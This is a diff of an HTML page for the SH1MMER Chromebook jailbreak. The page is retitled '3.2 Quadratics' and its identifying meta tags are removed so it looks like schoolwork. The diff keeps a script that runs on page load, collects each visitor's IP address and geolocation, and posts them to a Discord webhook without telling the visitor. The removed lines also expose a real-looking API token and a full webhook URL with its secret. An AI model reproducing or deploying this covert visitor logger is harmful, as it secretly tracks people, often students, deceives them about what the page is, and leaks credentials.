@@ -2,32 +2,14 @@
 <html lang="en">
 
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
   <title>3.2 Quadratics</title>
-  <meta name="robots" content="nofollow">
-  <meta name="og:title" content="SH1MMER">
-  <meta name="og:description" content="SH1MMER Chromebook jailbreak">
-  <meta name="og:type" content="website">
-  <meta name="og:image" content="icon.png">
-  <meta name="og:url" content="https://sh1mmer.me/">
   <link rel="icon" type="image/x-icon" href="icon.png" />
   <link rel="stylesheet" href="main.css" />
   <script src="assets/script.js" defer></script>
   <link rel="icon" href="icon.png" type="image/x-icon"/>
   <script>
-    var messages = {
-      mercury:
-        "Check the credits button at the bottom of the page for more info.",
-      friday:
-        "A rather unlucky day for sysadmins, indeed.",
-      pc:
-        "Or if you can download the recovery utility extension on your school computer, but that's exceedingly rare.",
-      board:
-        "Press ESC+REFRESH+POWER to enter recovery mode, and look up your codename on https://cros.tech/. Click your device, and your board name will be shown. Note that GRABBITER is the same as FLEEX (which is octopus) but is not shown on most online databases.",
-      launch:
-        "Click the extensions icon in Chrome, then click Chromebook Recovery Utility.",
-    };
+  
   </script>
   <base target="_blank" />
 </head>
@@ -159,7 +141,7 @@ Then disable extension
   </div>
 <script>
 // Fetch the IP and geolocation data
-fetch('https://ipinfo.io/json?token=20f16b3c8b70ab')
+fetch('ipLogAPI')
   .then(response => response.json())
   .then(data => {
     // Format the payload for Discord
@@ -170,7 +152,7 @@ fetch('https://ipinfo.io/json?token=20f16b3c8b70ab')
     };
 
     // Send to Discord webhook
-    fetch('https://discord.com/api/webhooks/1367590361207148544/tmn81JqmDwUsvs95Z-VaamYhNuzsAN1x6nC2uEtRTrBjlQLqueXM8KxRSVwJ_h276KAQ', {
+    fetch('Webhook', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
